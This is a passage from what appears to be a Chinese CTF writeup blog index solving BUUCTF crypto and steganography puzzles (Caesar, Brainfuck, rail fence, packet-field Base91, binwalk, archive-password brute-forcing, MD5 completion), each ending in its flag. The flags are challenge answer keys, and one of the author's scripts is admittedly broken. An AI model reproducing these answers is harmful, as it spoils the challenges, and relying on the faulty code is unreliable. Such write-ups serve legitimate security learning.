class=\"line\">s2:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">26</span>):</span><br><span class=\"line\">    s2=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(letter)&gt;=<span class=\"number\">97</span> <span class=\"keyword\">and</span> <span class=\"built_in\">ord</span>(letter)&lt;=<span class=\"number\">122</span> :</span><br><span class=\"line\">            v1=<span class=\"built_in\">ord</span>(letter)+i</span><br><span class=\"line\">            <span class=\"keyword\">if</span> v1&gt;<span class=\"number\">122</span>:</span><br><span class=\"line\">                s2+=<span class=\"built_in\">chr</span>(<span class=\"number\">97</span>+v1-<span class=\"number\">123</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                s2+=<span class=\"built_in\">chr</span>(v1)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            s2+=letter</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(s2)</span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tzou&#123;5qr1004r-86o5-46r8-p720-psp5po0417s1&#125;</span><br><span class=\"line\">uapv&#123;5rs1004s-86p5-46s8-q720-qtq5qp0417t1&#125;</span><br><span class=\"line\">vbqw&#123;5st1004t-86q5-46t8-r720-rur5rq0417u1&#125;</span><br><span class=\"line\">wcrx&#123;5tu1004u-86r5-46u8-s720-svs5sr0417v1&#125;</span><br><span class=\"line\">xdsy&#123;5uv1004v-86s5-46v8-t720-twt5ts0417w1&#125;</span><br><span class=\"line\">yetz&#123;5vw1004w-86t5-46w8-u720-uxu5ut0417x1&#125;</span><br><span class=\"line\">zfua&#123;5wx1004x-86u5-46x8-v720-vyv5vu0417y1&#125;</span><br><span class=\"line\">agvb&#123;5xy1004y-86v5-46y8-w720-wzw5wv0417z1&#125;</span><br><span class=\"line\">bhwc&#123;5yz1004z-86w5-46z8-x720-xax5xw0417a1&#125;</span><br><span class=\"line\">cixd&#123;5za1004a-86x5-46a8-y720-yby5yx0417b1&#125;</span><br><span class=\"line\">djye&#123;5ab1004b-86y5-46b8-z720-zcz5zy0417c1&#125;</span><br><span class=\"line\">ekzf&#123;5bc1004c-86z5-46c8-a720-ada5az0417d1&#125;</span><br><span class=\"line\">flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</span><br><span class=\"line\">gmbh&#123;5de1004e-86b5-46e8-c720-cfc5cb0417f1&#125;</span><br><span class=\"line\">hnci&#123;5ef1004f-86c5-46f8-d720-dgd5dc0417g1&#125;</span><br><span class=\"line\">iodj&#123;5fg1004g-86d5-46g8-e720-ehe5ed0417h1&#125;</span><br><span class=\"line\">jpek&#123;5gh1004h-86e5-46h8-f720-fif5fe0417i1&#125;</span><br><span class=\"line\">kqfl&#123;5hi1004i-86f5-46i8-g720-gjg5gf0417j1&#125;</span><br><span class=\"line\">lrgm&#123;5ij1004j-86g5-46j8-h720-hkh5hg0417k1&#125;</span><br><span class=\"line\">mshn&#123;5jk1004k-86h5-46k8-i720-ili5ih0417l1&#125;</span><br><span class=\"line\">ntio&#123;5kl1004l-86i5-46l8-j720-jmj5ji0417m1&#125;</span><br><span class=\"line\">oujp&#123;5lm1004m-86j5-46m8-k720-knk5kj0417n1&#125;</span><br><span class=\"line\">pvkq&#123;5mn1004n-86k5-46n8-l720-lol5lk0417o1&#125;</span><br><span class=\"line\">qwlr&#123;5no1004o-86l5-46o8-m720-mpm5ml0417p1&#125;</span><br><span class=\"line\">rxms&#123;5op1004p-86m5-46p8-n720-nqn5nm0417q1&#125;</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{5cd1004d-86a5-46d8-b720-beb5ba0417e1}</del></p>\n","categories":["Crypto","rot13"]},{"title":"神秘龙卷风","url":"/2021/08/25/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E/","content":"<p><a href=\"https://buuoj.cn/challenges#%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E\">题目链接</a><br>附件下载解压，得到一个rar，根据题意，用[[ARCHPR]纯四位数字爆破：<br>![](/images/Writeup/20210825195620.png]<br>得到了一段神秘信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">                  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                       +++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                            +++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++</span><br><span class=\"line\">                                   +++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                         ++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                            ++++++.&gt;++++++++++++++++++++++</span><br><span class=\"line\">                                              ++++++++++++++++++++++++++</span><br><span class=\"line\">                                               ++++++++++++++++++++++++</span><br><span class=\"line\">                                                ++++++++++++++++++++++</span><br><span class=\"line\">                                                 +++++++++.&gt;+++++++++</span><br><span class=\"line\">                                                  ++++++++++++++++++</span><br><span class=\"line\">                                                  ++++++++++++++++++</span><br><span class=\"line\">                                                  ++++++++++++++++++</span><br><span class=\"line\">                                                  ++++++++++++++++++</span><br><span class=\"line\">                                                 ++++++++++++++++++++</span><br><span class=\"line\">                                               ++++++++++++++++++++++.&gt;</span><br><span class=\"line\">                                             +++++++++++++++++++++++++++</span><br><span class=\"line\">                                           +++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                        +++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                      ++++++.&gt;++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                    ++++++++++++++++++.&gt;+++++++++++++++++++++++++++</span><br><span class=\"line\">                                  ++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                                +++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                            ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++</span><br><span class=\"line\">                         ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                      +++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class=\"line\">                   +++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++</span><br><span class=\"line\">                +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++</span><br><span class=\"line\">            +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++</span><br><span class=\"line\">       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;</span><br><span class=\"line\">+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.&gt;</span><br></pre></td></tr></table></figure>\n<p>看到这种格式，应该是Brainfuck代码，在线解码一下：<br>![](/images/Writeup/20210825195810.png]<br>flag:<del>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</del></p>\n","categories":["Crypto","Misc","压缩包破解","Brainfuck"]},{"title":"篱笆墙的影子","url":"/2021/08/26/%E7%AF%B1%E7%AC%86%E5%A2%99%E7%9A%84%E5%BD%B1%E5%AD%90/","content":"<p><a href=\"https://buuoj.cn/challenges#%E7%AF%B1%E7%AC%86%E5%A2%99%E7%9A%84%E5%BD%B1%E5%AD%90\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>密文是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br></pre></td></tr></table></figure>\n<p>看一下其中的规律，发现flag中间隔了几个字符，用python分开看一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;felhaagv&#123;ewtehtehfilnakgw&#125;&quot;</span></span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\">s2:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">s3:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(s1):</span><br><span class=\"line\">\t <span class=\"keyword\">if</span> i%<span class=\"number\">2</span>==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t s2+=s1[i]</span><br><span class=\"line\">\t <span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t s3+=s1[i]</span><br><span class=\"line\">\t i+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s2+s3)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{wethinkwehavetheflag}</del></p>\n","categories":["Crypto","凯撒密码"]},{"title":"羊城杯 2020-TCP_IP","url":"/2021/08/29/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-TCP_IP/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]TCP_IP\">题目链接</a><br>这道题附件是一个流量包，但是追踪TCP流之后发现里面并没有有效信息：<br>![](/images/Writeup/20210829134540.png]<br>![](/images/Writeup/20210829134542.png]<br>看起来应该都是英语听力。。而后[[010Editor]和[[Binwalk]分析隐写文件，也没有发现特征。于是在流量包里面寻找线索：<br>![](/images/Writeup/20210829134731.png]<br>分析大概率只有Identification里面可能有数据（数据范围在ASCII表范围内）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">s_raw=[64,105,72,60,44,123,42,59,111,85,112,47,105,109,34,81,80,108,96,121,82,42,105,101,125,78,75,59,46,68,33,88,117,41,98,58,74,91,82,106,43,54,75,75,77,55,80,64,105,72,60,44,123,42,59,111,85,112,47,105,109,34,81,80,108,96,121,82]</span><br></pre></td></tr></table></figure>\n<p>写个脚本处理一下数据：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s_raw=[<span class=\"number\">64</span>,<span class=\"number\">105</span>,<span class=\"number\">72</span>,<span class=\"number\">60</span>,<span class=\"number\">44</span>,<span class=\"number\">123</span>,<span class=\"number\">42</span>,<span class=\"number\">59</span>,<span class=\"number\">111</span>,<span class=\"number\">85</span>,<span class=\"number\">112</span>,<span class=\"number\">47</span>,<span class=\"number\">105</span>,<span class=\"number\">109</span>,<span class=\"number\">34</span>,<span class=\"number\">81</span>,<span class=\"number\">80</span>,<span class=\"number\">108</span>,<span class=\"number\">96</span>,<span class=\"number\">121</span>,<span class=\"number\">82</span>,<span class=\"number\">42</span>,<span class=\"number\">105</span>,<span class=\"number\">101</span>,<span class=\"number\">125</span>,<span class=\"number\">78</span>,<span class=\"number\">75</span>,<span class=\"number\">59</span>,<span class=\"number\">46</span>,<span class=\"number\">68</span>,<span class=\"number\">33</span>,<span class=\"number\">88</span>,<span class=\"number\">117</span>,<span class=\"number\">41</span>,<span class=\"number\">98</span>,<span class=\"number\">58</span>,<span class=\"number\">74</span>,<span class=\"number\">91</span>,<span class=\"number\">82</span>,<span class=\"number\">106</span>,<span class=\"number\">43</span>,<span class=\"number\">54</span>,<span class=\"number\">75</span>,<span class=\"number\">75</span>,<span class=\"number\">77</span>,<span class=\"number\">55</span>,<span class=\"number\">80</span>,<span class=\"number\">64</span>,<span class=\"number\">105</span>,<span class=\"number\">72</span>,<span class=\"number\">60</span>,<span class=\"number\">44</span>,<span class=\"number\">123</span>,<span class=\"number\">42</span>,<span class=\"number\">59</span>,<span class=\"number\">111</span>,<span class=\"number\">85</span>,<span class=\"number\">112</span>,<span class=\"number\">47</span>,<span class=\"number\">105</span>,<span class=\"number\">109</span>,<span class=\"number\">34</span>,<span class=\"number\">81</span>,<span class=\"number\">80</span>,<span class=\"number\">108</span>,<span class=\"number\">96</span>,<span class=\"number\">121</span>,<span class=\"number\">82</span>]</span><br><span class=\"line\">s_out:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s_raw:</span><br><span class=\"line\">\ts_out+=<span class=\"built_in\">chr</span>(letter)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(s_out)</span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@iH&lt;,&#123;*;oUp/im&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im&quot;QPl`yR</span><br></pre></td></tr></table></figure>\n<p>用<a href=\"https://www.dcode.fr/base-91-encoding\">Base91 Encoding</a>或者脚本转换一下Base91编码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base91</span><br><span class=\"line\">s=<span class=\"string\">&quot;@iH&lt;,&#123;*;oUp/im&quot;</span>QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im<span class=\"string\">&quot;QPl`yR&quot;</span></span><br><span class=\"line\">decode = base91.decode(s)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(decode))</span><br></pre></td></tr></table></figure>\n<p>或者，干脆全部写到一起：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base91</span><br><span class=\"line\">s_raw_1=[<span class=\"number\">64</span>,<span class=\"number\">105</span>,<span class=\"number\">72</span>,<span class=\"number\">60</span>,<span class=\"number\">44</span>,<span class=\"number\">123</span>,<span class=\"number\">42</span>,<span class=\"number\">59</span>,<span class=\"number\">111</span>,<span class=\"number\">85</span>,<span class=\"number\">112</span>,<span class=\"number\">47</span>,<span class=\"number\">105</span>,<span class=\"number\">109</span>,<span class=\"number\">34</span>,<span class=\"number\">81</span>,<span class=\"number\">80</span>,<span class=\"number\">108</span>,<span class=\"number\">96</span>,<span class=\"number\">121</span>,<span class=\"number\">82</span>,<span class=\"number\">42</span>,<span class=\"number\">105</span>,<span class=\"number\">101</span>,<span class=\"number\">125</span>,<span class=\"number\">78</span>,<span class=\"number\">75</span>,<span class=\"number\">59</span>,<span class=\"number\">46</span>,<span class=\"number\">68</span>,<span class=\"number\">33</span>,<span class=\"number\">88</span>,<span class=\"number\">117</span>,<span class=\"number\">41</span>,<span class=\"number\">98</span>,<span class=\"number\">58</span>,<span class=\"number\">74</span>,<span class=\"number\">91</span>,<span class=\"number\">82</span>,<span class=\"number\">106</span>,<span class=\"number\">43</span>,<span class=\"number\">54</span>,<span class=\"number\">75</span>,<span class=\"number\">75</span>,<span class=\"number\">77</span>,<span class=\"number\">55</span>,<span class=\"number\">80</span>,<span class=\"number\">64</span>,<span class=\"number\">105</span>,<span class=\"number\">72</span>,<span class=\"number\">60</span>,<span class=\"number\">44</span>,<span class=\"number\">123</span>,<span class=\"number\">42</span>,<span class=\"number\">59</span>,<span class=\"number\">111</span>,<span class=\"number\">85</span>,<span class=\"number\">112</span>,<span class=\"number\">47</span>,<span class=\"number\">105</span>,<span class=\"number\">109</span>,<span class=\"number\">34</span>,<span class=\"number\">81</span>,<span class=\"number\">80</span>,<span class=\"number\">108</span>,<span class=\"number\">96</span>,<span class=\"number\">121</span>,<span class=\"number\">82</span>]</span><br><span class=\"line\">s_raw_2:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s_raw_1:</span><br><span class=\"line\">\ts_raw_2+=<span class=\"built_in\">chr</span>(letter)</span><br><span class=\"line\">s_out = base91.decode(s_raw_2)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(s_out))</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bytearray(b&#x27;flag&#123;wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA\\xfd\\xe3\\x9f&quot;1w\\xe3Aw\\xea\\xbe\\x18\\tXV\\xb8|\\x8f&#x27;)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA}</del></p>\n","categories":["Web","流量审计"]},{"title":"萌萌哒的八戒","url":"/2021/08/26/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E5%85%AB%E6%88%92/","content":"<p><a href=\"https://buuoj.cn/challenges#%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E5%85%AB%E6%88%92\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：<br>![[Pasted image 20210828070325.png]]<br>二话不说，直接百度，得到猪圈密码：<br><img src=\"https://img-blog.csdnimg.cn/20200212103433425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQwNDMxNA==,size_16,color_FFFFFF,t_70\"><br>flag:<del>flag{whenthepigwanttoeat}</del></p>\n","categories":["Crypto"]},{"title":"谁赢了比赛？","url":"/2021/09/02/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/","content":"<p><a href=\"https://buuoj.cn/challenges#%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F\">题目链接</a><br>附件下载解压，得到一张png：<br>![](/images/Writeup/20210902152549.png]<br>检查了一遍，感觉信息不在图片本身，用[[Binwalk]分析一下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/CTF$ binwalk -e who_won_the_game.png</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             PNG image, 10000 x 10000, 8-bit/color RGB, non-interlaced</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Extractor.execute failed to run external extractor &#x27;unrar e &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;unrar&#x27;, &#x27;unrar e &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Extractor.execute failed to run external extractor &#x27;unrar -x &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;unrar&#x27;, &#x27;unrar -x &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class=\"line\">1430236       0x15D2DC        RAR archive data, version 4.x, first volume type: MAIN_HEAD</span><br></pre></td></tr></table></figure>\n<p>得到了一个rar文件，并且压缩包存在密码：<br>![](/images/Writeup/20210902154841.png]<br>尝试使用[[ARCHPR]暴力枚举：<br>![](/images/Writeup/20210902154902.png]<br>得到以下文件：<br>![](/images/Writeup/20210902154931.png]<br>txt文件里面没有关键信息，gif文件用[[Stegsolve]提取全部动画帧，得到：<br>![](/images/Writeup/20210902162526.png]<br>在其中发现特殊帧：<br>![](/images/Writeup/20210902162554.png]<br>用[[Stegsolve]检查此文件信息，发现在Red plane0发现隐藏图像：<br>![](/images/Writeup/20210902163047.png]<br>![](/images/Writeup/20210902163058.png]<br>flag:<del>flag{shanxiajingwu_won_the_game}</del></p>\n","categories":["Misc","图片隐写"]},{"title":"还原大师","url":"/2021/08/26/%E8%BF%98%E5%8E%9F%E5%A4%A7%E5%B8%88/","content":"<p><a href=\"https://buuoj.cn/challenges#%E8%BF%98%E5%8E%9F%E5%A4%A7%E5%B8%88\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">E903???4DAB????08?????51?80??8A?</span><br></pre></td></tr></table></figure>\n<p>明文:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TASC?O3RJMV?WDJKX?ZM</span><br></pre></td></tr></table></figure>\n<p>考虑用脚本做一下碰撞:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">s1=[<span class=\"string\">&#x27;TASC&#x27;</span>,<span class=\"string\">&#x27;O3RJMV&#x27;</span>,<span class=\"string\">&#x27;WDJKX&#x27;</span>,<span class=\"string\">&#x27;ZM&#x27;</span>]</span><br><span class=\"line\">a:<span class=\"built_in\">int</span>=<span class=\"number\">65</span></span><br><span class=\"line\">b:<span class=\"built_in\">int</span>=<span class=\"number\">65</span></span><br><span class=\"line\">c:<span class=\"built_in\">int</span>=<span class=\"number\">65</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> a&lt;=<span class=\"number\">90</span>:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> b&lt;=<span class=\"number\">90</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> c&lt;=<span class=\"number\">90</span>:</span><br><span class=\"line\">            m = hashlib.md5()</span><br><span class=\"line\">            m.update((s1[<span class=\"number\">0</span>]+<span class=\"built_in\">chr</span>(a)+s1[<span class=\"number\">1</span>]+<span class=\"built_in\">chr</span>(b)+s1[<span class=\"number\">2</span>]+<span class=\"built_in\">chr</span>(c)+s1[<span class=\"number\">3</span>]).encode(<span class=\"string\">&quot;utf-8&quot;</span>))</span><br><span class=\"line\">            s=m.hexdigest()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> s[<span class=\"number\">0</span>:<span class=\"number\">3</span>]==<span class=\"string\">&#x27;E903&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(s+<span class=\"string\">&quot;     XD&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">                <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">            c+=<span class=\"number\">1</span></span><br><span class=\"line\">        b+=<span class=\"number\">1</span></span><br><span class=\"line\">        c=<span class=\"number\">65</span></span><br><span class=\"line\">    a+=<span class=\"number\">1</span></span><br><span class=\"line\">    b=<span class=\"number\">65</span></span><br><span class=\"line\">    c=<span class=\"number\">65</span></span><br></pre></td></tr></table></figure>\n<p>好像哪里写错了。。借用网上大佬的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print hashlib.md5(s).hexdigest().upper()</span></span><br><span class=\"line\">k = <span class=\"string\">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span>                    <span class=\"comment\">#要还原的明文</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">\ttemp1 = k.replace(<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">chr</span>(<span class=\"number\">65</span>+i)),<span class=\"number\">1</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">\t\ttemp2 = temp1.replace(<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"built_in\">chr</span>(<span class=\"number\">65</span>+j),<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">\t\t\ttemp3 = temp2.replace(<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"built_in\">chr</span>(<span class=\"number\">65</span>+n),<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\ts = hashlib.md5(temp3.encode(<span class=\"string\">&#x27;utf8&#x27;</span>)).hexdigest().upper()<span class=\"comment\">#注意大小写</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> s[:<span class=\"number\">4</span>] == <span class=\"string\">&#x27;E903&#x27;</span>:    <span class=\"comment\">#检查元素</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span> (s)       <span class=\"comment\">#输出密文</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ————————————————</span></span><br><span class=\"line\"><span class=\"comment\"># 版权声明：本文为CSDN博主「宁嘉」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上# 原文出处链接及本声明。</span></span><br><span class=\"line\"><span class=\"comment\"># 原文链接：https://blog.csdn.net/MikeCoke/article/details/106118054</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{E9032994DABAC08080091151380478A2}</del></p>\n","categories":["Crypto","MD5"]},{"title":"隐藏的钥匙","url":"/2021/08/25/%E9%9A%90%E8%97%8F%E7%9A%84%E9%92%A5%E5%8C%99/","content":"<p><a href=\"https://buuoj.cn/challenges#%E9%9A%90%E8%97%8F%E7%9A%84%E9%92%A5%E5%8C%99\">题目链接</a><br>附件下载解压，得到一张jpg，用[[Stegsolve]看一下文件信息，结果软件直接卡死了，看来应该是往里面塞了隐藏文件，用[[Binwalk]看一下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/CTF$ binwalk 1.jpg</span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class=\"line\">95196         0x173DC         JPEG image data, JFIF standard 1.01</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>看来没有隐藏文件，就直接用[[010Editor]看一下：<br>![](/images/Writeup/20210825192523.png]</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</span><br></pre></td></tr></table></figure>\n<p>看里面应该是Base64加密的，base64解密一下看看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">377cbadda1eca2f2f73d36277781f00a</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{377cbadda1eca2f2f73d36277781f00a}</del></p>\n","categories":["Misc","图片隐写"]},{"title":"Misc-压缩包类分析","url":"/2021/09/22/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90/","content":"<blockquote>\n<p>在Misc领域中，关于压缩包的知识是很基本的，近几年被考烂的；但同时也是每位Misc手，乃至每位CTFer都应该了解的重要知识点。在Misc领域，关于压缩包分析的知识可以说占了一大部分。而其中又包括了像文件数据结构的识别、 